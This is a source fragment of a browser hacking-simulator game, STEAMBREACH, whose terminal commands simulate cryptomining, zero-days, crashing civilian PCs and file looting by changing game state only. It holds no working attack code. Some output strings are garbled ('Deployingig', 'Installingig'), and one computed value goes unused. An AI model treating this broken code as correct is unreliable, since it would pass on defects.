          setHeat(h => Math.min(h + heatAdd, 100));
          playSuccess();
          setIsProcessing(false);
          return `[+] xmrig running. Hashrate: ${(threads * 0.6).toFixed(1)} kH/s\n[+] Estimated income: +₿${incomeBonus.toLocaleString()}/hr on this node.\n[!] Heat +${heatAdd}% (CPU ${maxCpu}% — ${maxCpu > 80 ? 'SOC will notice the spike' : maxCpu > 50 ? 'moderate detection risk' : 'low profile'}).`;
        }

        if (gameMode === 'field') {
          if (!arg1) return `[-] xmrig: Select CPU intensity:\n    xmrig low     — 25% CPU, ₿${(300 * mult).toLocaleString()}/hr, very low detection\n    xmrig medium  — 50% CPU, ₿${(600 * mult).toLocaleString()}/hr, moderate detection\n    xmrig high    — 100% CPU, ₿${(1200 * mult).toLocaleString()}/hr, SOC notices within minutes`;

          const intensities = {
            low:    { cpu: 25, income: 300, heatAdd: 1, risk: 'very low detection risk' },
            medium: { cpu: 50, income: 600, heatAdd: 4, risk: 'moderate detection risk' },
            high:   { cpu: 100, income: 1200, heatAdd: 10, risk: 'WILL trigger CPU alerts' },
          };
          const intensity = intensities[arg1];
          if (!intensity) return "[-] xmrig: Invalid intensity. Use: low, medium, or high";

          setIsProcessing(true);
          setTerminal(prev => [...prev, { type: 'out', text: `[*] Deployingig at ${intensity.cpu}% CPU...\n[*] Connecting to mining pool...`, isNew: false }]);
          await new Promise(r => setTimeout(r, 1200));

          const hourlyIncome = Math.floor(intensity.income * getMineRigMult() * getEconomyMarketMult());
          setLooted(prev => [...prev, xmrigKey]);
          const heatAdd = inventory.includes('Cooling') ? Math.ceil(intensity.heatAdd / 2) : intensity.heatAdd;
          setHeat(h => Math.min(h + heatAdd, 100));
          playSuccess();
          setIsProcessing(false);
          return `[+]ig active — ${intensity.cpu}% CPU, +₿${hourlyIncome.toLocaleString()}/hr.\n[!] ${intensity.risk}. Heat +${heatAdd}%.`;
        }

        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `[*] Installingig cryptominer...\n[*] Connecting to Monero pool...`, isNew: false }]);
        await new Promise(r => setTimeout(r, 1200));

        const hourlyIncome = Math.floor(HOURLY_RATE * getMineRigMult() * getEconomyMarketMult());
        setLooted(prev => [...prev, xmrigKey]);
        const heatAdd = inventory.includes('Cooling') ? 2 : 3;
        setHeat(h => Math.min(h + heatAdd, 100));
        playSuccess();
        setIsProcessing(false);
        const contractMsg = verifyContract(targetIP, 'mine');
        return `[+]IG DEPLOYED. Mining Monero at +₿${hourlyIncome.toLocaleString()}/hr.\n[!] Heat +${heatAdd}%.`;
      },

      use: async () => {
        if (!arg1) return `[-] Usage: use <item>\n[*] Available: decoy (${consumables.decoy}), burner (${consumables.burner}), 0day (${consumables.zeroday})`;
        
        if (arg1 === 'decoy') {
            if (consumables.decoy <= 0) return `[-] You don't have any Trace Decoys. Find them hidden in network files.`;
            if (!isInside) return `[-] Trace Decoys must be used while inside a target network.`;
            setConsumables(c => ({ ...c, decoy: c.decoy - 1 }));
            setTrace(t => Math.max(t - 30, 0));
            return `[*] Deploying Trace Decoy...\n[+] Trace reduced by 30%.`;
        }
        if (arg1 === 'burner') {
            if (consumables.burner <= 0) return `[-] You don't have any Burner VPNs. Find them hidden in network files.`;
            setConsumables(c => ({ ...c, burner: c.burner - 1 }));
            setHeat(h => Math.max(h - 25, 0));
            return `[*] Routing connection through Burner VPN...\n[+] Global Heat reduced by 25%.`;
        }
        if (arg1 === '0day') {
            if (consumables.zeroday <= 0) return `[-] You don't have any Zero-Day exploits.`;
            if (!isInside) return `[-] Zero-Days must be used while inside a target network.`;
            if (privilege === 'root') return `[-] You already have root access on this node.`;
            setConsumables(c => ({ ...c, zeroday: c.zeroday - 1 }));
            setPrivilege('root');
            playRootShell();
            return `[*] Executing unknown Zero-Day payload...\n[+] Buffer overflow successful.\n[+] Root privileges granted. Bypassed all logging.`;
        }
        return `[-] Unknown consumable item: ${arg1}`;
      },

      assist: async () => {
        if (!pendingInteraction || pendingInteraction.kind !== 'assist') return '[-] No civilian support issue is currently queued.';
        if (!isInside || targetIP !== pendingInteraction.id.split(':')[0]) return '[-] You need to be on the affected civilian node to do that.';
        const signalGain = pendingInteraction.signal || 0;
        const heatDelta = pendingInteraction.heatDelta || 0;
        setMorality(prev => ({ ...prev, signal: prev.signal + signalGain }));
        if (heatDelta) setHeat(h => Math.max(0, Math.min(100, h + heatDelta)));
        clearPendingInteraction();
        playSuccess();
        return `[+] Quiet maintenance complete. System stabilized without alerting the owner.
[+] SIGNAL +${signalGain}${heatDelta ? ` | HEAT ${heatDelta}` : ''}`;
      },

      crashpc: async () => {
        if (!pendingInteraction || pendingInteraction.kind !== 'crash') return '[-] No civilian crash opportunity is currently queued.';
        if (!isInside || targetIP !== pendingInteraction.id.split(':')[0]) return '[-] You need to be on the exposed civilian machine to do that.';
        const chaosGain = pendingInteraction.chaos || 0;
        const heatDelta = pendingInteraction.heatDelta || 0;
        const payout = Math.floor(Math.random() * 45) + 15;
        setMorality(prev => ({ ...prev, chaos: prev.chaos + chaosGain }));
        setMoney(m => m + payout);
        if (heatDelta) setHeat(h => Math.max(0, Math.min(100, h + heatDelta)));
        const doomedIP = targetIP;
        const doomedName = world[doomedIP]?.org?.orgName || doomedIP;
        clearPendingInteraction();
        setBotnet(prev => prev.filter(ip => ip !== doomedIP));
        setProxies(prev => prev.filter(ip => ip !== doomedIP));
        setIsInside(false); setTargetIP(null); setCurrentDir('~'); setPrivilege('local');
        setWorld(prev => { const nw = { ...prev }; delete nw[doomedIP]; return nw; });
        playDestroy();
        return `[+] Kernel panic induced on ${doomedName}. Endpoint crashed hard and dropped off the grid.
[+] CHAOS +${chaosGain} | ₿${payout.toLocaleString()} scavenged.`;
      },

      salvage: async () => {
        if (!pendingInteraction || pendingInteraction.kind !== 'salvage') return '[-] No hidden opportunity is currently queued.';
        if (!isInside || targetIP !== pendingInteraction.id.split(':')[0]) return '[-] You need to be on the civilian node that holds the clue.';
        const roll = Math.random();
        let out = `[+] You quietly harvested something useful from the civilian system.`;
        if (roll < 0.4) {
          setConsumables(c => ({ ...c, decoy: c.decoy + 1 }));
          out += `
[+] Recovered: Trace Decoy x1`;
        } else if (roll < 0.75) {
          setConsumables(c => ({ ...c, burner: c.burner + 1 }));
          out += `
[+] Recovered: Burner VPN x1`;
        } else if (roll < 0.92) {
          const amt = Math.floor(Math.random() * 350) + 150;
          setMoney(m => m + amt);
          out += `
[+] Liquidated hidden wallet data for ₿${amt.toLocaleString()}`;
        } else {
          setConsumables(c => ({ ...c, zeroday: c.zeroday + 1 }));
          out += `
[+] Recovered: Zero-Day Exploit x1`;
        }
        clearPendingInteraction();
        playSuccess();
        return out;
      },

    ls: async () => {
  const target = resolvePath(arg1, currentDir);
  const listing = fs[target]; // (If 'fs' throws an error, change it to activeNode.files[target])
  if (!listing) return `ls: cannot access '${arg1 || currentDir}': No such file or directory`;
  return listing.join('  ');
},
      cd: async () => {
        const dest = arg1 === '..' ? (currentDir.split('/').slice(0, -1).join('/') || '/') : resolvePath(arg1, currentDir);
        if (fs[dest] || dest === '/') { setCurrentDir(dest); return ''; }
        return `bash: cd: ${arg1}: No such file or directory`;
      },
      cat: async () => {
  try {
    const fileName = arg1;
    if (!fileName) return "usage: cat [file]";

    // 1. Handle consumable items
    const isConsumable = ['decoy.bin', 'burner.ovpn', '0day_poc.sh', 'wallet.dat'].includes(fileName);
    if (isConsumable) {
      const currentDirFiles = fs[currentDir] || [];
      if (!currentDirFiles.includes(fileName)) return `cat: ${fileName}: No such file`;
      
      setWorld(prev => {
        const nw = { ...prev };
        const targetNode = isInside ? targetIP : 'local';
        nw[targetNode].files[currentDir] = nw[targetNode].files[currentDir].filter(f => f !== fileName);
        return nw;
      });

      if (fileName === 'wallet.dat') {
        const amt = Math.floor(Math.random() * 800 + 200);
        setMoney(m => m + amt);
        playSuccess();
        return `[+] SUCCESS: Decrypted slush fund wallet.\n[+] ₿${amt.toLocaleString()} added to your account.`;
      } else if (fileName === 'decoy.bin') {
        setConsumables(c => ({ ...c, decoy: c.decoy + 1 }));
        playSuccess();
        return `[+] SUCCESS: Recovered Trace Decoy!\n[*] Type 'use decoy' during a hack to reduce Trace by 30%.`;
      } else if (fileName === 'burner.ovpn') {
        setConsumables(c => ({ ...c, burner: c.burner + 1 }));
        playSuccess();
        return `[+] SUCCESS: Recovered Burner VPN Cert!\n[*] Type 'use burner' to reduce global Heat by 25%.`;
      } else if (fileName === '0day_poc.sh') {
        setConsumables(c => ({ ...c, zeroday: c.zeroday + 1 }));
        playSuccess();
        return `[+] SUCCESS: Recovered Zero-Day Exploit!\n[*] Type 'use 0day' during a hack for instant root access.`;
      }
    }

    // 2. Resolve the actual file contents (Hardened Pathing)
    const absolutePath = currentDir === '/' ? `/${fileName}` : `${currentDir}/${fileName}`;
    let rawData = contents[absolutePath] || contents[fileName];

    if (!rawData && contents) {
      const fallbackKey = Object.keys(contents).find(k => k.endsWith('/' + fileName) || k === fileName);
      if (fallbackKey) rawData = contents[fallbackKey];
    }

    if (!rawData) return `cat: ${fileName}: No such file`;

    // --- NEW: THE SUDO TEASE (Block 2.5) ---
    // Check if the user is touching restricted system areas without root
    const restrictedDirs = ['/root', '/etc/shadow', '/var/log', '/SYS/CONFIG', '/SECURE_LOGS'];
    const isRestricted = restrictedDirs.some(p => absolutePath.startsWith(p));

    if (isRestricted && privilege !== 'root') {
      // 1. Mechanical Penalty: Touching restricted files makes you "louder"
      if (isInside) escalateBlueTeam(targetIP, 5); 

      // 2. The Tease
      setTerminal(prev => [...prev, { 
        type: 'out', 
        text: `[!] Permission denied. Current user '${isInside ? 'www-data' : 'guest'}' is not in the sudoers file.\n[!] This incident will be reported to the System Administrator.`, 
        isNew: true 
      }]);
      
      return null; // Stop execution here
    }

    // 3. File-specific checks based on contents
    if (typeof rawData === 'string' && rawData.includes('[STORY_TRIGGER]')) {
      if (!isInside) return '[-] Must be inside a target node to read intercepts.';
      
      const story = activeStory || generateStory(targetIP);
      if (!activeStory) setActiveStory(story);
      
      return `[INTERCEPTED TRANSMISSION — ${fileName}]\n\n${story.story}\n\n[1] ${story.good_action}\n[2] ${story.evil_action}\n\n[*] Type 'resolve 1' or 'resolve 2' to choose.`;
    }

    // 4. Handle High-Tier Locks safely
    if (typeof rawData === 'string' && rawData.startsWith('[LOCKED]')) {
      if (privilege !== 'root') return `cat: ${fileName}: Permission denied. Root required.`;
      rawData = rawData.replace('[LOCKED] ', '').replace('[LOCKED]', '');
    }

    // 5. AI Generation
    if (typeof rawData === 'string' && (rawData.includes('[PENDING_GENERATION]') || rawData.includes('[LORE_PENDING]'))) {
      setIsProcessing(true);
      setTerminal(prev => [...prev, { type: 'out', text: `[*] Decoding data stream...`, isNew: false }]);

      const contextHint = rawData.includes('[HASH]') ? 'password hashes file' : (fileName?.endsWith('.eml') ? 'internal email between employees' : 'standard server file');
      
      let aiText = "";
      try {
        const system = `You are a backend file generator for a hacking simulator called STEAMBREACH. Generate realistic file contents for the organization "${world[targetIP]?.org?.orgName || 'Unknown'}". Write MAX 8 lines. Match the file extension exactly. Hide useful intel naturally. Never use markdown.`;
        const prompt = `Generate realistic contents for: ${fileName}\nContext: ${contextHint}`;
        
        aiText = await generateDirectorText(prompt, system);
      } catch (e) { 
        aiText = `[ERROR] Stream corrupted. Partial recovery logged.`; 
      }

      if (isInside && world[targetIP]?.val) { aiText += `\n\n[SYSTEM] EXTRACTABLE ASSETS: ₿${world[targetIP].val.toLocaleString()}`; }

      setWorld(prev => {
        const nw = { ...prev };
        const key = isInside ? targetIP : 'local';
        if (nw[key] && nw[key].contents) {
          nw[key].contents[absolutePath] = aiText;
        }
        return nw;
      });

      if (isInside) escalateBlueTeam(targetIP, 5);
      setIsProcessing(false);
      setTerminal(prev => [...prev, { type: 'out', text: aiText, isNew: true }]);
      return null;
    }

    // 6. Normal File Output
    setTerminal(prev => [...prev, { type: 'out', text: rawData, isNew: true }]);
    
    // Civilian interaction hook
    if (isInside && isCivilianNode(targetIP)) {
      const interaction = buildCivilianInteraction(fileName, rawData, targetIP);
      if (interaction) {
        setPendingInteraction(interaction);
        setTerminal(prev => [
          ...prev,
          { type: 'out', text: `\n${interaction.prompt}\n[*] ${interaction.rewardText}`, isNew: true }
        ]);
      }
    }
    return null;

  } catch (err) {
    setIsProcessing(false);
    return `[-] FATAL ERROR in cat command: ${err.message}`;
  }
},

      exit: async () => {
        setIsInside(false); setTargetIP(null); setCurrentDir('~'); setPrivilege('local');
        return '[*] Session closed.';
      },
      pwd: async () => currentDir,
      clear: async () => { setTerminal([]); return ''; },
      save: async () => { saveGame(operator); return `[+] Game saved: "${operator}"`; },
      menu: async () => {
        if (isInside) return "[-] Exit current session before returning to main menu.";
        saveGame(`auto_${operator}`); setScreen('intro'); setMenuMode('main'); setDeleteTarget(null); setMenuIndex(0); return '';
      },
      reset_grid: async () => { localStorage.clear(); window.location.reload(); return "PURGING..."; },
      shop: async () => { 
        if (isInside) return "[-] Exit session first."; 
        openHardwareMarket();
        if (walletFrozen) return `[!] WARNING: Wallet frozen. Only Bribe SOC available until heat drops below 75%.`;
        return ''; 
      },
      hardware: async () => {
        if (isInside) return "[-] Exit session first.";
        openHardwareMarket();
        return '';
      },
      rig: async () => {
        if (isInside) return "[-] Exit session first.";
        openHardwareMarket();
        return '';
      },
      status: async () => {
  const d = director; const score = d.skillScore; const maxHops = getMaxProxySlots(inventory, d.modifiers);
  let threatLevel = 'STANDARD';
  if (score >= 40) threatLevel = 'CRITICAL'; else if (score >= 15) threatLevel = 'ELEVATED';
  else if (score <= -40) threatLevel = 'DORMANT'; else if (score <= -15) threatLevel = 'REDUCED';
  const priceMult = getHeatPriceMult(heat);
  const priceStr = priceMult > 1 ? `+${Math.round((priceMult - 1) * 100)}%` : 'NORMAL';
  let wantedInfo = '';
  if (wantedTier === 'COLD') wantedInfo = '  No active law enforcement interest.';
  else if (wantedTier === 'WARM') wantedInfo = '  Preliminary investigation opened. Market prices inflated.';
  else if (wantedTier === 'HOT') wantedInfo = '  Active FBI investigation. Botnet nodes being raided. Prices inflated.';
  else if (wantedTier === 'CRITICAL') wantedInfo = '  INTERPOL red notice. Proxy hops targeted. Wallet FROZEN. Prices inflated.';
  else if (wantedTier === 'MANHUNT') wantedInfo = '  FULL MANHUNT. All infrastructure under coordinated attack. Wallet FROZEN.';

  return `OPERATOR STATUS REPORT
────────────────────────────────────
WANTED LEVEL: ${wantedTier} (HEAT ${heat}%)
${wantedInfo}
MARKET PRICES: ${priceStr}${walletFrozen ? ' | WALLET: FROZEN' : ' | WALLET: ACTIVE'}

THREAT ASSESSMENT: ${threatLevel}
GLOBAL SOC POSTURE: ${score >= 15 ? 'AGGRESSIVE' : score <= -15 ? 'DISTRACTED' : 'NOMINAL'}
PROXY CHAIN CAPACITY: ${proxies.length}/${maxHops} HOPS
BOTNET NODES: ${botnet.length} | ACTIVE MINERS: ${getMinerNodes()} (PASSIVE INCOME: ₿${getPassiveIncomeRate().toLocaleString()}/hr)
CONTRACTS COMPLETED: ${d.metrics.contractsCompleted}
NODES LOOTED: ${d.metrics.nodesLooted}

MORALITY: ${getMoralityRank()}
SIGNAL: ${morality.signal} | CHAOS: ${morality.chaos}

INVENTORY:
  DECOYS: ${consumables.decoy} | BURNER VPNS: ${consumables.burner} | ZERO-DAYS: ${consumables.zeroday}
────────────────────────────────────
${wantedTier === 'MANHUNT' ? '[!!!] REDUCE HEAT IMMEDIATELY. Your entire network is being dismantled.' : ''}${wantedTier === 'CRITICAL' ? '[!] Wallet frozen. Use wipe on rooted nodes or Bribe SOC Insider to reduce heat.' : ''}${wantedTier === 'HOT' ? '[!] Botnet nodes are being raided. Consider wiping logs or bribing SOC.' : ''}${score >= 40 ? '[!] Blue Team response elevated due to your skill profile.' : ''}${score <= -15 ? '[*] Sector defenses weakened. Favorable conditions.' : ''}`;
},
      help: async () => {
        setShowHelpMenu(true);
        return `[*] Opening Command Reference Manual...`;
      }
    };

    if (COMMANDS[cmd]) {
      output = await COMMANDS[cmd](); trackCommand(cmd, true);
      if (output === null) return; if (cmd === 'clear') return;
      if (cmd !== 'cat') { setTerminal(prev => [...prev, { type: 'out', text: output, isNew: true }]); }
    } else {
      trackCommand(cmd, false);
      playFailure();
      if (isInside && looted.length >= 3) {
        setHeat(h => Math.min(h + 5, 100));
        setTerminal(prev => [...prev, { type: 'out', text: `bash: ${cmd}: command not found\n[!] IDS logged invalid command. Heat +5%`, isNew: true }]);
      } else { setTerminal(prev => [...prev, { type: 'out', text: `bash: ${cmd}: command not found`, isNew: true }]); }
    }
  };

  // Mobile touch UI handler
  const executeQuickCommand = useCallback((cmd) => {
    if (isProcessing) return;
    hapticLight();
    setShowMobileKeyboard(false);
    handleCommand(null, cmd);
  }, [isProcessing, handleCommand]);

  const fillPartialCommand = useCallback((partial) => {
    hapticLight();
    setInput(partial);
    setShowMobileKeyboard(true);
    if (inputRef.current) inputRef.current.focus();
  }, []);

  // ==========================================
  // SCREENS
  // ==========================================
  
 if (screen === 'login') {
    return (
      <div style={{
        background: COLORS.bg, color: COLORS.text, position: 'absolute', top: 0, bottom: 0, left: 0, right: 0,
        display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', fontFamily: "'Consolas', 'Fira Code', 'JetBrains Mono', monospace"
      }}>
        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, background: `repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px)`, pointerEvents: 'none', zIndex: 100 }} />
        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, background: 'radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.4) 100%)', pointerEvents: 'none', zIndex: 99 }} />

        <div style={{ textAlign: 'center', zIndex: 10, width: '500px', border: `1px solid ${COLORS.primary}40`, padding: '40px', background: COLORS.bgPanel, borderRadius: '4px' }}>
          <div style={{ color: COLORS.primary, fontSize: '18px', fontWeight: 'bold', letterSpacing: '4px', marginBottom: '20px' }}>SECURE TERMINAL AUTHENTICATION</div>
          
          <div style={{ color: COLORS.textDim, fontSize: '12px', lineHeight: '1.6', marginBottom: '30px', textAlign: 'left' }}>
            To connect to the darknet and dynamically generate targets, you must provide a valid Gemini API Token. This key is stored entirely on your local machine.
            <br/><br/>
            <span style={{color: COLORS.warning}}>▸ Get your free API key at: </span>
            <a href="https://aistudio.google.com/app/apikey" target="_blank" rel="noreferrer" style={{color: COLORS.primary}}>aistudio.google.com</a>
          </div>

          <div style={{ display: 'flex', alignItems: 'center', borderBottom: `1px solid ${COLORS.primary}`, paddingBottom: '8px' }}>
            <span style={{ color: COLORS.secondary, marginRight: '10px' }}>KEY:</span>
            <input
              type="password"
              autoFocus
              style={{
                background: 'transparent', border: 'none', color: COLORS.text, outline: 'none',
                fontFamily: 'inherit', fontSize: '14px', width: '100%', letterSpacing: '2px'
              }}
              value={input}
              onChange={e => setInput(e.target.value)}
              onKeyDown={e => {
                if (e.key === 'Enter' && input.length > 10) {
                  localStorage.setItem('breach_api_key', input.trim());
                  setApiKey(input.trim());
                  setInput('');
                  setScreen('intro');
                }
              }}
              placeholder="AIzaSy..."
            />
          </div>
          <div style={{ color: COLORS.textDim, fontSize: '10px', marginTop: '16px', letterSpacing: '1px' }}>[ENTER] TO AUTHENTICATE</div>
        </div>
      </div>
    );
  }

  if (screen === 'intro') {
    const saves = getAllSaveSlots();

    const getSaveInfo = (name) => {
      try {
        const data = JSON.parse(localStorage.getItem(`breach_slot_${name}`));
        if (!data) return null;
        return { operator: data.operator || 'Unknown', gameMode: data.gameMode || 'arcade', money: data.money || 0, reputation: data.reputation || 0, botnet: data.botnet?.length || 0, nodesLooted: data.looted?.length || 0, timestamp: data.timestamp };
      } catch { return null; }
    };

    const formatTime = (ts) => {
      if (!ts) return 'Unknown';
      const d = new Date(ts); const now = new Date(); const diff = now - d;
      if (diff < 60000) return 'Just now'; if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
      if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
      return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    };

    return (
      <div style={{
        background: COLORS.bg, color: COLORS.text, position: 'absolute', top: 0, bottom: 0, left: 0, right: 0,
        display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', fontFamily: "'Consolas', 'Fira Code', 'JetBrains Mono', monospace"
      }}>
        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, background: `repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px)`, pointerEvents: 'none', zIndex: 100 }} />
        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, background: 'radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.4) 100%)', pointerEvents: 'none', zIndex: 99 }} />

        <div style={{ textAlign: 'center', zIndex: 10 }}>
          <div style={{ fontSize: '11px', color: COLORS.textDim, letterSpacing: '6px', marginBottom: '8px' }}></div>
          <h1 style={{ color: COLORS.primary, fontSize: '32px', fontWeight: 'normal', letterSpacing: '8px', margin: '0 0 4px 0' }}>STEAMBREACH</h1>
          <div style={{ fontSize: '10px', color: COLORS.textDim, letterSpacing: '3px', marginBottom: '32px' }}>AI-POWERED NETWORK EXPLOITATION SIMULATOR</div>

          {menuMode === 'main' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', width: '300px', margin: '0 auto' }}>
         
        <button 
          onMouseEnter={() => setMenuIndex(-1)}
          onClick={() => setScreen('soundmanager')} 
          style={{
            background: menuIndex === -1 ? `${COLORS.primary}20` : COLORS.bgPanel, 
            color: COLORS.primary, 
            border: `1px solid ${menuIndex === -1 ? COLORS.primary : COLORS.border}`,
            padding: '12px', cursor: 'pointer', fontFamily: 'inherit', fontSize: '13px', 
            borderRadius: '3px', letterSpacing: '2px', transition: 'all 0.15s'
          }}>
          {menuIndex === -1 ? '▶ ' : '  '}AUDIO MANAGER
        </button>
<button 
       onMouseEnter={() => setMenuIndex(-2)}
       onClick={() => setScreen('aisettings')} 
       style={{
         background: menuIndex === -2 ? `${COLORS.primary}20` : COLORS.bgPanel, 
         color: COLORS.primary, 
         border: `1px solid ${menuIndex === -2 ? COLORS.primary : COLORS.border}`,
         padding: '12px', cursor: 'pointer', fontFamily: 'inherit', fontSize: '13px', 
         borderRadius: '3px', letterSpacing: '2px', transition: 'all 0.15s'
       }}>
       {menuIndex === -2 ? '▶ ' : '  '}AI DIRECTOR SETTINGS
     </button>
              
              <button 
                onMouseEnter={() => setMenuIndex(0)}
                onClick={() => { setMenuMode('newgame'); setMenuIndex(0); setOperator(''); }} 
                style={{
                  background: menuIndex === 0 ? `${COLORS.secondary}20` : COLORS.bgPanel, 
                  color: menuIndex === 0 ? COLORS.secondary : COLORS.text, 
                  border: `1px solid ${menuIndex === 0 ? COLORS.secondary : COLORS.border}`,
                  padding: '12px', cursor: 'pointer', fontFamily: 'inherit', fontSize: '13px', 
                  borderRadius: '3px', letterSpacing: '2px', transition: 'all 0.15s'
                }}>
                {menuIndex === 0 ? '▶ ' : '  '}NEW GAME
              </button>
              
             <button 
          onMouseEnter={() => setMenuIndex(1)}
          onClick={() => { setMenuMode('load'); setMenuIndex(0); }} 
          disabled={saves.length === 0} 
          style={{
            background: menuIndex === 1 ? `${COLORS.primary}20` : COLORS.bgPanel, 
            color: saves.length > 0 ? COLORS.text : COLORS.textDim, 
            border: `1px solid ${menuIndex === 1 ? COLORS.primary : COLORS.border}`,
            padding: '12px', 
            cursor: saves.length > 0 ? 'pointer' : 'default', 
            fontFamily: 'inherit', 
            fontSize: '13px', 
            borderRadius: '3px', 
            letterSpacing: '2px', 
            opacity: saves.length > 0 ? 1 : 0.4,
          }}>
          {menuIndex === 1 ? '▶ ' : '  '}LOAD GAME {saves.length > 0 && `(${saves.length})`}
        </button>
              
              <button 
                onMouseEnter={() => setMenuIndex(2)}
                onClick={() => { setMenuMode('delete'); setMenuIndex(0); }} disabled={saves.length === 0} style={{
                background: menuIndex === 2 ? `${COLORS.danger}20` : COLORS.bgPanel, color: saves.length > 0 ? COLORS.danger : COLORS.textDim, border: `1px solid ${menuIndex === 2 ? COLORS.danger : COLORS.border}`,
                padding: '12px', cursor: saves.length > 0 ? 'pointer' : 'default', fontFamily: 'inherit', fontSize: '13px', borderRadius: '3px', letterSpacing: '2px', opacity: saves.length > 0 ? 1 : 0.4,
              }}>{menuIndex === 2 ? '▸ ' : '  '}DELETE SAVE</button>
              <div style={{color: COLORS.textDim, fontSize: '10px', marginTop: '10px'}}>[UP/DOWN] NAVIGATE | [ENTER] SELECT</div>
            </div>
          )}

          {menuMode === 'newgame' && (
            <div style={{ border: `1px solid ${COLORS.border}`, padding: '24px 32px', background: COLORS.bgPanel, borderRadius: '4px', width: '400px' }}>
              <div style={{ color: COLORS.textDim, fontSize: '11px', marginBottom: '12px', letterSpacing: '2px' }}>IDENTIFY OPERATOR</div>
              <input
                autoFocus
                style={{
                  background: 'transparent', border: 'none', borderBottom: `1px solid ${COLORS.primary}`, color: COLORS.primary, textAlign: 'center',
                  outline: 'none', fontFamily: 'inherit', fontSize: '16px', padding: '4px 0', width: '200px', display: 'block', margin: '0 auto'
                }}
                value={operator}
                onChange={e => setOperator(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && operator.length > 0 && startNewGame(operator, gameMode)}
              />

              <div style={{ color: COLORS.textDim, fontSize: '11px', marginTop: '20px', marginBottom: '10px', letterSpacing: '2px' }}>SELECT MODE</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                {[
                  { id: 'arcade', name: 'ARCADE', desc: 'Learn the tools. Type the name, get the result.', color: COLORS.secondary, mult: '1x' },
                  { id: 'field', name: 'FIELD', desc: 'Choose the right flags and options. Tactical decisions.', color: COLORS.warning, mult: '2x' },
                  { id: 'operator', name: 'OPERATOR', desc: 'Full real syntax. Parse real output. No hand-holding.', color: COLORS.danger, mult: '4x' },
                ].map((m, idx) => (
                  <div key={m.id} 
                    onClick={() => setGameMode(m.id)} 
                    style={{
                      border: `1px solid ${gameMode === m.id ? m.color : COLORS.border}`, background: gameMode === m.id ? `${m.color}10` : 'transparent',
                      padding: '10px 12px', borderRadius: '3px', cursor: 'pointer', transition: 'border-color 0.15s, background 0.15s',
                  }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ color: gameMode === m.id ? m.color : COLORS.text, fontSize: '12px', fontWeight: gameMode === m.id ? 'bold' : 'normal', letterSpacing: '1px' }}>
                        {gameMode === m.id ? '▸ ' : '  '}{m.name}
                      </span>
                      <span style={{ color: m.color, fontSize: '10px' }}>{m.mult} REWARDS</span>
                    </div>
                    <div style={{ color: COLORS.textDim, fontSize: '10px', marginTop: '3px', paddingLeft: '12px' }}>{m.desc}</div>
                  </div>
                ))}
              </div>

              <div style={{ marginTop: '16px', display: 'flex', gap: '8px', justifyContent: 'center', flexDirection: 'column', alignItems: 'center' }}>
                <button 
                  onClick={() => operator.length > 0 && startNewGame(operator, gameMode)}
                  disabled={operator.length === 0}
                  style={{
                    background: operator.length > 0 ? COLORS.primary : COLORS.bgDark,
                    color: operator.length > 0 ? COLORS.bgDark : COLORS.textDim,
                    border: `1px solid ${operator.length > 0 ? COLORS.primary : COLORS.border}`,
                    padding: '10px 40px', cursor: operator.length > 0 ? 'pointer' : 'default',
                    fontFamily: 'inherit', fontSize: '13px', fontWeight: 'bold',
                    borderRadius: '3px', letterSpacing: '2px',
                    opacity: operator.length > 0 ? 1 : 0.4,
                    transition: 'all 0.15s',
                  }}>
                  START GAME
                </button>
                <div style={{color: COLORS.textDim, fontSize: '10px', marginTop: '4px'}}>[UP/DOWN] CHANGE MODE | [ENTER] START | [ESC] CANCEL</div>
                <button onClick={() => { setMenuMode('main'); setMenuIndex(0); }} style={{
                  marginTop: '12px', background: 'transparent', border: `1px solid ${COLORS.border}`, color: COLORS.textDim,
                  padding: '10px 20px', cursor: 'pointer', fontFamily: 'inherit', fontSize: '12px', borderRadius: '3px', letterSpacing: '1px', width: '100%',
                }}>← BACK</button>
              </div>
            </div>
          )}

          {menuMode === 'load' && (
            <div style={{ width: '420px' }}>
              <div style={{ color: COLORS.textDim, fontSize: '11px', marginBottom: '12px', letterSpacing: '2px' }}>SELECT SAVE FILE</div>
              <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
                {saves.slice().reverse().map((name, idx) => {
                  const info = getSaveInfo(name); const isAuto = name.startsWith('auto_');
                  const mColor = info?.gameMode === 'operator' ? COLORS.danger : info?.gameMode === 'field' ? COLORS.warning : COLORS.secondary;
                  const isSelected = menuIndex === idx;
                  return (
                    <div key={name} 
                      onMouseEnter={() => setMenuIndex(idx)}
                      onClick={() => { loadGame(name); setScreen('game'); }}
                      style={{
                        border: `1px solid ${isSelected ? COLORS.primary : COLORS.border}`, padding: '12px', marginBottom: '6px',
                        borderRadius: '3px', background: isSelected ? `${COLORS.primary}20` : COLORS.bgPanel, cursor: 'pointer',
                    }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px', alignItems: 'center' }}>
                        <span style={{ color: isAuto ? COLORS.textDim : COLORS.primary, fontSize: '12px' }}>
                          {isSelected ? '▸ ' : ''}{isAuto ? '◦ AUTO' : '◉ MANUAL'} — {info?.operator || name}
                        </span>
                        <span style={{ display: 'flex', gap: '6px', alignItems: 'center' }}>
                          <span style={{ color: mColor, fontSize: '9px', border: `1px solid ${mColor}40`, padding: '1px 5px', borderRadius: '2px' }}>{(info?.gameMode || 'arcade').toUpperCase()}</span>
